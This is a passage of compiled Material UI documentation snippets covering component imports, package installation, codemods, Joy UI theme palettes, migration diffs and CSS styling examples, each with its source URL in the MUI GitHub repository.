'@mui/joy/FormControl';\nimport FormHelperText from '@mui/joy/FormHelperText';\n```\n\n----------------------------------------\n\nTITLE: Downloading and Extracting Joy UI Example Project\nDESCRIPTION: Commands for downloading the Joy UI with Vite.js TypeScript example from the Material-UI GitHub repository and navigating to the project directory.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/joy-ui-vite-ts/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/joy-ui-vite-ts\ncd joy-ui-vite-ts\n```\n\n----------------------------------------\n\nTITLE: Boolean Props Type Definition\nDESCRIPTION: Type definition example showing boolean props structure for component variations\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/api/api.md#2025-04-22_snippet_2\n\nLANGUAGE: tsx\nCODE:\n```\ntype Props = {\n  contained: boolean;\n  fab: boolean;\n};\n```\n\n----------------------------------------\n\nTITLE: Basic Alert Import and Usage - React/JSX\nDESCRIPTION: Basic import statement for using the Alert component from Material UI\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/alert/alert.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Alert from '@mui/material/Alert';\n```\n\n----------------------------------------\n\nTITLE: Component Link Header Reference\nDESCRIPTION: Reference to a Material-UI documentation component header.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/transfer-list/transfer-list.md#2025-04-22_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n{\"component\": \"@mui/docs/ComponentLinkHeader\"}\n```\n\n----------------------------------------\n\nTITLE: Running Codemod to Remove Owner State from Theme\nDESCRIPTION: A bash command to run the Material UI codemod that helps migrate theme configurations by removing owner state callbacks.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_13\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v6.0.0/theme-v6 next.config.mjs\n```\n\n----------------------------------------\n\nTITLE: Defining CssVarsProvider Props in JavaScript\nDESCRIPTION: This snippet outlines the props for the CssVarsProvider component in MUI, including options for default mode, transition disabling, theme configuration, and storage key for mode.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/experimental-api/css-theme-variables/css-theme-variables.md#2025-04-22_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  defaultMode: 'light' | 'dark' | 'system',\n  disableTransitionOnChange: boolean,\n  theme: {\n    colorSchemes: { [key: string]: ColorScheme },\n    colorSchemeSelector: 'media' | 'class' | 'data' | string,\n    generateStyleSheets: () => Record<string, string>,\n    generateThemeVars: () => Record<string, any>\n  },\n  modeStorageKey: string\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Webpack Vendor Chunk for MUI Styles\nDESCRIPTION: Webpack configuration to create a vendor chunk for @mui/styles to avoid multiple instances in multiple applications.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/faq/faq.md#2025-04-22_snippet_10\n\nLANGUAGE: diff\nCODE:\n```\n  module.exports = {\n    entry: {\n+     vendor: ['@mui/styles'],\n      app1: './src/app.1.js',\n      app2: './src/app.2.js',\n    },\n    plugins: [\n+     new webpack.optimize.CommonsChunkPlugin({\n+       name: 'vendor',\n+       minChunks: Infinity,\n+     }),\n    ]\n  }\n```\n\n----------------------------------------\n\nTITLE: Installing MUI System with Emotion\nDESCRIPTION: Command to install MUI System with its default styling engine Emotion using different package managers.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/installation/installation.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/system @emotion/react @emotion/styled\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm add @mui/system @emotion/react @emotion/styled\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @mui/system @emotion/react @emotion/styled\n```\n\n----------------------------------------\n\nTITLE: Running the top-level-imports codemod\nDESCRIPTION: Command to execute the codemod that converts @material-ui/core submodule imports to the root module.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_119\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v4.0.0/top-level-imports <path>\n```\n\n----------------------------------------\n\nTITLE: Importing Toggle Button Group in React\nDESCRIPTION: This snippet shows how to import the ToggleButtonGroup component from Joy UI. It's the basic setup required to use the component in a React application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/toggle-button-group/toggle-button-group.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport ToggleButtonGroup from '@mui/joy/ToggleButtonGroup';\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI CDN Example\nDESCRIPTION: Commands to download and set up the Material UI CDN example project from GitHub.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-via-cdn/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-via-cdn\ncd material-ui-via-cdn\n```\n\n----------------------------------------\n\nTITLE: Removing srOnly Typography variant in React\nDESCRIPTION: Removes the srOnly variant from Typography component and shows how to use the visuallyHidden utility with the sx prop instead.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_46\n\nLANGUAGE: diff\nCODE:\n```\n+import { visuallyHidden } from '@mui/utils';\n\n-<Typography variant=\"srOnly\">Create a user</Typography>\n+<span style={visuallyHidden}>Create a user</span>\n```\n\n----------------------------------------\n\nTITLE: Enabling Row Grouping in DataGridPro (JavaScript)\nDESCRIPTION: This snippet shows how to enable the experimental row grouping feature in the DataGridPro component. It's currently available in the Pro plan by setting the experimentalFeatures prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/introducing-the-row-grouping-feature.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n<DataGridPro experimentalFeatures={{ rowGrouping: true }} {...otherProps} />\n```\n\n----------------------------------------\n\nTITLE: Updating TablePagination CSS classes in React\nDESCRIPTION: Separates classes for different table pagination labels and moves the custom class on input to select in TablePagination.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_32\n\nLANGUAGE: diff\nCODE:\n```\n  <TablePagination\n-  classes={{ caption: 'foo' }}\n+  classes={{ selectLabel: 'foo', displayedRows: 'foo' }}\n  />\n\n  <TablePagination\n-  classes={{ input: 'foo' }}\n+  classes={{ select: 'foo' }}\n  />\n```\n\n----------------------------------------\n\nTITLE: Importing Box Component in React\nDESCRIPTION: Basic import statement for the Box component from Joy UI package.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/box/box.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Box from '@mui/joy/Box';\n```\n\n----------------------------------------\n\nTITLE: HTML Badge Display in Markdown for Material UI\nDESCRIPTION: HTML markup embedded in a Markdown document to display the Material UI logo and various badges for license, npm versions, downloads, GitHub status, and social media.\nSOURCE: https://github.com/mui/material-ui/blob/master/README.md#2025-04-22_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<p align=\"center\">\n  <a href=\"https://mui.com/core/\" rel=\"noopener\" target=\"_blank\"><img width=\"150\" height=\"133\" src=\"https://mui.com/static/logo.svg\" alt=\"Material UI logo\"></a>\n</p>\n\n<h1 align=\"center\">Material UI</h1>\n\n<div align=\"center\">\n\n[![license](https://img.shields.io/badge/license-MIT-blue.svg)](https://github.com/mui/material-ui/blob/HEAD/LICENSE)\n[![npm latest package](https://img.shields.io/npm/v/@mui/material/latest.svg)](https://www.npmjs.com/package/@mui/material)\n[![npm next package](https://img.shields.io/npm/v/@mui/material/next.svg)](https://www.npmjs.com/package/@mui/material)\n[![npm downloads](https://img.shields.io/npm/dm/@mui/material.svg)](https://www.npmjs.com/package/@mui/material)\n[![GitHub branch status](https://img.shields.io/github/checks-status/mui/material-ui/HEAD)](https://github.com/mui/material-ui/commits/HEAD/)\n[![Coverage Status](https://img.shields.io/codecov/c/github/mui/material-ui.svg)](https://app.codecov.io/gh/mui/material-ui/)\n[![Follow on X](https://img.shields.io/twitter/follow/MaterialUI.svg?label=follow+Material+UI)](https://x.com/MaterialUI)\n[![Renovate status](https://img.shields.io/badge/renovate-enabled-brightgreen.svg)](https://github.com/mui/material-ui/issues/27062)\n[![Average time to resolve an issue](https://isitmaintained.com/badge/resolution/mui/material-ui.svg)](https://isitmaintained.com/project/mui/material-ui 'Average time to resolve an issue')\n[![Open Collective backers and sponsors](https://img.shields.io/opencollective/all/mui-org)](https://opencollective.com/mui-org)\n[![OpenSSF Best Practices](https://www.bestpractices.dev/projects/1320/badge)](https://www.bestpractices.dev/projects/1320)\n\n</div>\n```\n\n----------------------------------------\n\nTITLE: Installing and Running Joy UI Example Project\nDESCRIPTION: Commands to install the project dependencies and start the development server. Uses npm to manage packages and run the application.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/joy-ui-cra-ts/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm start\n```\n\n----------------------------------------\n\nTITLE: Updating Material UI Styles Dependency\nDESCRIPTION: JSON configuration showing how to update the Material UI styles dependency in package.json to version 4.0.0.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n\"dependencies\": {\n  \"@material-ui/styles\": \"^4.0.0\"\n}\n```\n\n----------------------------------------\n\nTITLE: Advanced Styling with Conditional Logic in Material UI Theme Overrides\nDESCRIPTION: This snippet shows how to use an array to return multiple style objects based on component props and theme values, allowing for more complex styling logic in theme overrides.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/callback-support-in-style-overrides.md#2025-04-22_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  root: ({ ownerState, theme }) => [\n    theme.unstable_sx({\n      px: '12px',\n      py: '6px',\n      fontWeight: 500,\n      borderRadius: '8px',\n    }),\n    ownerState.variant === 'outlined' && ownerState.color === 'default' &&\n      theme.unstable_sx({\n        borderColor: 'text.secondary',\n      }),\n    ownerState.size === 'small' &&\n      theme.unstable_sx({\n        fontSize: { xs: '0.875rem', sm: '0.75rem' },\n      })\n  ],\n}\n```\n\n----------------------------------------\n\nTITLE: Installing and Running the Material UI Preact Example\nDESCRIPTION: Commands to install the project dependencies and start the development server for the Material UI Preact example.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-preact/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm run start\n```\n\n----------------------------------------\n\nTITLE: Mask Implementation Examples\nDESCRIPTION: Demonstrates mask usage in the new date picker implementation.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/pickers-migration/pickers-migration.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n<DatePicker\n  mask=\"mm\"\n  value={new Date()}\n  onChange={console.log}\n  renderInput={(props) => (\n    <TextField {...props} helperText=\"invalid mask\" />\n  )}\n/>\n\n<DatePicker\n  value={new Date()}\n  onChange={console.log}\n  renderInput={(props) => (\n    <TextField {...props} helperText=\"valid mask\" />\n  )}\n/>\n```\n\n----------------------------------------\n\nTITLE: Building Workspace Packages for Pigment CSS Vite Demo\nDESCRIPTION: Command to build all packages in the workspace before running the Pigment CSS Vite demo project. This is a necessary prerequisite step.\nSOURCE: https://github.com/mui/material-ui/blob/master/apps/pigment-css-vite-app/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\npnpm build\n```\n\n----------------------------------------\n\nTITLE: Basic Tabs Import in React\nDESCRIPTION: Basic import statement for using Material-UI Tabs component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/tabs/tabs.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Tabs from '@mui/material/Tabs';\nimport Tab from '@mui/material/Tab';\n```\n\n----------------------------------------\n\nTITLE: Importing Badge Component in React\nDESCRIPTION: Basic import statement for the Badge component from MUI Joy UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/badge/badge.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Badge from '@mui/joy/Badge';\n```\n\n----------------------------------------\n\nTITLE: Creating Component Slots with Styled API in Material UI\nDESCRIPTION: This snippet demonstrates how to create component slots using the styled API in Material UI. It defines three slots: root, value, and unit, each with specific styling applied.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/creating-themed-components/creating-themed-components.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport * as React from 'react';\nimport { styled } from '@mui/material/styles';\n\nconst StatRoot = styled('div', {\n  name: 'MuiStat', // The component name\n  slot: 'root', // The slot name\n})(({ theme }) => ({\n  display: 'flex',\n  flexDirection: 'column',\n  gap: theme.spacing(0.5),\n  padding: theme.spacing(3, 4),\n  backgroundColor: theme.palette.background.paper,\n  borderRadius: theme.shape.borderRadius,\n  boxShadow: theme.shadows[2],\n  letterSpacing: '-0.025em',\n  fontWeight: 600,\n}));\n\nconst StatValue = styled('div', {\n  name: 'MuiStat',\n  slot: 'value',\n})(({ theme }) => ({\n  ...theme.typography.h3,\n}));\n\nconst StatUnit = styled('div', {\n  name: 'MuiStat',\n  slot: 'unit',\n})(({ theme }) => ({\n  ...theme.typography.body2,\n  color: theme.palette.text.secondary,\n}));\n```\n\n----------------------------------------\n\nTITLE: Styling Deeper Elements with Custom Class Names\nDESCRIPTION: Shows how to provide custom class names to Material UI component slots using the slotProps API for more targeted styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_4\n\nLANGUAGE: CSS\nCODE:\n```\n.slider {\n  color: #20b2aa;\n}\n\n.slider:hover {\n  color: #2e8b57;\n}\n\n.slider .thumb {\n  border-radius: 1px;\n}\n```\n\nLANGUAGE: JSX\nCODE:\n```\nimport * as React from 'react';\nimport Slider from '@mui/material/Slider';\nimport './PlainCssSliderDeep2.css';\n\nexport default function PlainCssSliderDeep2() {\n  return (\n    <div>\n      <Slider defaultValue={30} />\n      <Slider\n        defaultValue={30}\n        className=\"slider\"\n        slotProps={{ thumb: { className: 'thumb' } }}\n      />\n    </div>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Avatar Component in Joy UI\nDESCRIPTION: Basic import statement for the Avatar component from Joy UI package.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/avatar/avatar.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Avatar from '@mui/joy/Avatar';\n```\n\n----------------------------------------\n\nTITLE: Importing Skeleton Component in React\nDESCRIPTION: Basic import statement for the Skeleton component from Joy UI, which is the first step to using it in a React application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/skeleton/skeleton.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Skeleton from '@mui/joy/Skeleton';\n```\n\n----------------------------------------\n\nTITLE: Downloading and Setting Up Material UI Next.js TypeScript Project\nDESCRIPTION: Commands to download the Material UI Next.js TypeScript example from GitHub and navigate to the project directory.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-nextjs-ts/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-nextjs-ts\ncd material-ui-nextjs-ts\n```\n\n----------------------------------------\n\nTITLE: Running Skeleton Variant Codemod Command\nDESCRIPTION: Command to execute the skeleton-variant codemod on a specified path. This updates Skeleton component variant values to the new naming convention.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_108\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/skeleton-variant <path>\n```\n\n----------------------------------------\n\nTITLE: Configuring Danger Color Palette Styles in Joy UI Theme\nDESCRIPTION: Defines CSS variables for danger color palette in dark theme. This includes styling for outlined, soft, and solid variant states in different interaction modes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\n          outlinedDisabledColor: `var(--joy-palette-danger-800)`,\n          outlinedDisabledBorder: `var(--joy-palette-danger-800)`,\n\n          softColor: `var(--joy-palette-danger-200)`,\n          softBg: `var(--joy-palette-danger-900)`,\n          softHoverBg: `var(--joy-palette-danger-800)`,\n          softActiveBg: `var(--joy-palette-danger-700)`,\n          softDisabledColor: `var(--joy-palette-danger-800)`,\n          softDisabledBg: `var(--joy-palette-danger-900)`,\n\n          solidColor: `#fff`,\n          solidBg: `var(--joy-palette-danger-600)`,\n          solidHoverBg: `var(--joy-palette-danger-700)`,\n          solidActiveBg: `var(--joy-palette-danger-800)`,\n          solidDisabledColor: `var(--joy-palette-danger-700)`,\n          solidDisabledBg: `var(--joy-palette-danger-900)`,\n        },\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Installing and Running the Next.js Application\nDESCRIPTION: Commands to install project dependencies and start the development server for the Next.js application.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-nextjs/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm run dev\n```\n\n----------------------------------------\n\nTITLE: Updating UMD Global Access\nDESCRIPTION: Change in global namespace access for Material-UI when used via CDN.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_25\n\nLANGUAGE: diff\nCODE:\n```\n const {\n   Button,\n   TextField,\n-} = window['material-ui'];\n+} = MaterialUI;\n```\n\n----------------------------------------\n\nTITLE: Migrating Dynamic Values in sx Prop\nDESCRIPTION: This snippet demonstrates how to migrate dynamic values in the sx prop to use CSS variables with inline styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_17\n\nLANGUAGE: javascript\nCODE:\n```\n<div>\n  {items.map((item, index) => (\n    <Box\n      key={index}\n      sx={{\n        borderRadius: '50%',\n        width: `max(${6 - index}px, 3px)`,\n        height: `max(${6 - index}px, 3px)`,\n        bgcolor: index === 0 ? 'primary.solidBg' : 'background.level3',\n      }}\n    />\n  ))}\n</div>\n```\n\nLANGUAGE: javascript\nCODE:\n```\n<div>\n  {items.map((item, index) => (\n    <Box\n      key={index}\n      sx={{\n        borderRadius: '50%',\n        width: `max(6px - var(--offset), 3px)`,\n        height: `max(6px - var(--offset), 3px)`,\n        bgcolor: index === 0 ? 'primary.solidBg' : 'background.level3',\n      }}\n      style={{\n        '--offset': `${index}px`,\n      }}\n    />\n  ))}\n</div>\n```\n\n----------------------------------------\n\nTITLE: Importing Menu Component for Breadcrumbs with Dropdown in React (Joy UI)\nDESCRIPTION: Import statement for the Menu component that can be used to create dropdown menus for condensed breadcrumbs navigation patterns.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/breadcrumbs/breadcrumbs.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\nimport Menu from '@mui/joy/Menu';\n```\n\n----------------------------------------\n\nTITLE: Updating Material-UI Package Imports\nDESCRIPTION: Replaces old @material-ui package imports with new @mui namespaced imports.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_117\n\nLANGUAGE: diff\nCODE:\n```\n-import Alert from '@material-ui/core/Alert';\n+import Alert from '@mui/material/Alert';\n```\n\n----------------------------------------\n\nTITLE: Alternative Grid2 Import Update\nDESCRIPTION: Another example of updating the import path for the Grid2 component when importing directly from its module.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_5\n\nLANGUAGE: diff\nCODE:\n```\n-import Grid from '@mui/material/Unstable_Grid2';\n+import Grid from '@mui/material/Grid2';\n```\n\n----------------------------------------\n\nTITLE: Running Material UI Next.js Project\nDESCRIPTION: Commands to install dependencies and start the development server for the Material UI Next.js example project.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-pigment-css-nextjs-ts/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm run dev\n```\n\n----------------------------------------\n\nTITLE: Creating and Starting Playground Environment\nDESCRIPTION: Commands to create and start a development playground for isolated component testing.\nSOURCE: https://github.com/mui/material-ui/blob/master/CONTRIBUTING.md#2025-04-22_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\npnpm docs:create-playground && pnpm start\n```\n\n----------------------------------------\n\nTITLE: Installing MUI System with styled-components\nDESCRIPTION: Command to install MUI System with styled-components as the styling engine using different package managers.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/installation/installation.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/system @mui/styled-engine-sc styled-components\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm add @mui/system @mui/styled-engine-sc styled-components\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @mui/system @mui/styled-engine-sc styled-components\n```\n\n----------------------------------------\n\nTITLE: Migrating Flat Button from v0.x to v1.x\nDESCRIPTION: Shows the changes needed to migrate Flat Button components from Material-UI v0.x to v1.x using the new Button component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v0x/migration-v0x.md#2025-04-22_snippet_5\n\nLANGUAGE: diff\nCODE:\n```\n-import FlatButton from 'material-ui/FlatButton';\n+import Button from '@material-ui/core/Button';\n\n-<FlatButton />\n+<Button />\n```\n\n----------------------------------------\n\nTITLE: Configuring Success Color Palette in Joy UI Theme\nDESCRIPTION: Defines a success color palette with shades from 50 to 900 and configures component states for light and dark themes. This includes styling for plain, outlined, soft, and solid variant states.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nconst success = {\n  50: '#F3FEF5',\n  100: '#D7F5DD',\n  200: '#77EC95',\n  300: '#4CC76E',\n  400: '#2CA24D',\n  500: '#1A7D36',\n  600: '#0F5D26',\n  700: '#034318',\n  800: '#002F0F',\n  900: '#001D09',\n};\n\nextendTheme({\n  colorSchemes: {\n    light: {\n      palette: {\n        success: {\n          ...success,\n          plainColor: `var(--joy-palette-success-600)`,\n          plainHoverBg: `var(--joy-palette-success-100)`,\n          plainActiveBg: `var(--joy-palette-success-200)`,\n          plainDisabledColor: `var(--joy-palette-success-200)`,\n\n          outlinedColor: `var(--joy-palette-success-500)`,\n          outlinedBorder: `var(--joy-palette-success-200)`,\n          outlinedHoverBg: `var(--joy-palette-success-100)`,\n          outlinedHoverBorder: `var(--joy-palette-success-300)`,\n          outlinedActiveBg: `var(--joy-palette-success-200)`,\n          outlinedDisabledColor: `var(--joy-palette-success-100)`,\n          outlinedDisabledBorder: `var(--joy-palette-success-100)`,\n\n          softColor: `var(--joy-palette-success-600)`,\n          softBg: `var(--joy-palette-success-100)`,\n          softHoverBg: `var(--joy-palette-success-200)`,\n          softActiveBg: `var(--joy-palette-success-300)`,\n          softDisabledColor: `var(--joy-palette-success-300)`,\n          softDisabledBg: `var(--joy-palette-success}-)50`,\n\n          solidColor: '#fff',\n          solidBg: `var(--joy-palette-success-500)`,\n          solidHoverBg: `var(--joy-palette-success-600)`,\n          solidActiveBg: `var(--joy-palette-success-700)`,\n          solidDisabledColor: `#fff`,\n          solidDisabledBg: `var(--joy-palette-success-200)`,\n        },\n      },\n    },\n    dark: {\n      palette: {\n        success: {\n          ...success,\n          plainColor: `var(--joy-palette-success-300)`,\n          plainHoverBg: `var(--joy-palette-success-800)`,\n          plainActiveBg: `var(--joy-palette-success-700)`,\n          plainDisabledColor: `var(--joy-palette-success-800)`,\n\n          outlinedColor: `var(--joy-palette-success-200)`,\n          outlinedBorder: `var(--joy-palette-success-700)`,\n          outlinedHoverBg: `var(--joy-palette-success-800)`,\n          outlinedHoverBorder: `var(--joy-palette-success-600)`,\n          outlinedActiveBg: `var(--joy-palette-success-900)`,\n          outlinedDisabledColor: `var(--joy-palette-success-800)`,\n          outlinedDisabledBorder: `var(--joy-palette-success-800)`,\n\n          softColor: `var(--joy-palette-success-200)`,\n          softBg: `var(--joy-palette-success-900)`,\n          softHoverBg: `var(--joy-palette-success-800)`,\n          softActiveBg: `var(--joy-palette-success-700)`,\n          softDisabledColor: `var(--joy-palette-success-800)`,\n          softDisabledBg: `var(--joy-palette-success-900)`,\n\n          solidColor: '#fff',\n          solidBg: `var(--joy-palette-success-600)`,\n          solidHoverBg: `var(--joy-palette-success-700)`,\n          solidActiveBg: `var(--joy-palette-success-800)`,\n          solidDisabledColor: `var(--joy-palette-success-700)`,\n          solidDisabledBg: `var(--joy-palette-success-900)`,\n        },\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Updating InputBase Theme Default Props\nDESCRIPTION: Updates MuiInputBase theme configuration to use the new slots/slotProps API instead of components/componentsProps.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_49\n\nLANGUAGE: diff\nCODE:\n```\n MuiInputBase: {\n   defaultProps: {\n-    components: { Input: CustomInput, Root: CustomRoot }\n-    componentsProps: { input: { id: 'test-input-id' }, root: { id: 'test-root-id' } }\n+    slots: { input: CustomInput, root: CustomRoot },\n+    slotProps: { input: { id: 'test-input-id' }, root: { id: 'test-root-id' } },\n   },\n },\n```\n\n----------------------------------------\n\nTITLE: Importing Input Component in React\nDESCRIPTION: Basic import statement for the Input component from Joy UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/input/input.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Input from '@mui/joy/Input';\n```\n\n----------------------------------------\n\nTITLE: Installing MUI Base via Yarn in Bash\nDESCRIPTION: This command installs the MUI Base package using Yarn. It provides another option for adding MUI Base to a project, catering to developers who use Yarn as their preferred package manager.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/introducing-base-ui.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @mui/base\n```\n\n----------------------------------------\n\nTITLE: Applying Width Styles with Material-UI Box Component\nDESCRIPTION: Examples of using the Box component with different width values, including fractions, pixels, percentages, and special values.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/sizing/sizing.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ width: 1/4 }}> // Equivalent to width: '25%'\n<Box sx={{ width: 300 }}> // Numbers are converted to pixel values.\n<Box sx={{ width: '75%' }}> // String values are used as raw CSS.\n<Box sx={{ width: 1 }}> // 100%\n```\n\n----------------------------------------\n\nTITLE: Updating Rating's readOnly CSS Class\nDESCRIPTION: Shows the CSS class change required when targeting readOnly Rating components, from the deprecated MuiRating-readOnly to the Mui-readOnly global class.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_21\n\nLANGUAGE: diff\nCODE:\n```\n-.MuiRating-readOnly\n+.Mui-readOnly\n```\n\n----------------------------------------\n\nTITLE: Importing Table Component in Joy UI\nDESCRIPTION: This snippet shows how to import the Table component from Joy UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/table/table.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Table from '@mui/joy/Table';\n```\n\n----------------------------------------\n\nTITLE: Updating ButtonGroup JavaScript Class Selectors\nDESCRIPTION: JavaScript code transformations for ButtonGroup component styling overrides. Shows changes from descendant selectors to more specific class combinations using buttonGroupClasses utility.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_13\n\nLANGUAGE: javascript\nCODE:\n```\nimport { buttonGroupClasses } from '@mui/material/ButtonGroup';\n\nMuiButtonGroup: {\n  styleOverrides: {\n    root: {\n      [`&.${buttonGroupClasses.horizontal} > .${buttonGroupClasses.grouped}`]: {\n         color: 'red',\n      },\n      [`&.${buttonGroupClasses.vertical} > .${buttonGroupClasses.grouped}`]: {\n         color: 'red',\n      },\n      [`&.${buttonGroupClasses.text} > .${buttonGroupClasses.grouped}`]: {\n         color: 'red',\n      },\n      [`&.${buttonGroupClasses.text}.${buttonGroupClasses.horizontal} > .${buttonGroupClasses.grouped}`]: {\n         color: 'red',\n      },\n      [`&.${buttonGroupClasses.text}.${buttonGroupClasses.vertical} > .${buttonGroupClasses.grouped}`]: {\n         color: 'red',\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Styling Deeper Elements with CSS Modules and slotProps\nDESCRIPTION: Shows an alternative approach to styling child elements using CSS Modules with the slotProps API, which allows providing custom class names to specific parts of a component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_15\n\nLANGUAGE: css\nCODE:\n```\n.slider {\n  color: #20b2aa;\n}\n\n.slider:hover {\n  color: #2e8b57;\n}\n\n.slider .thumb {\n  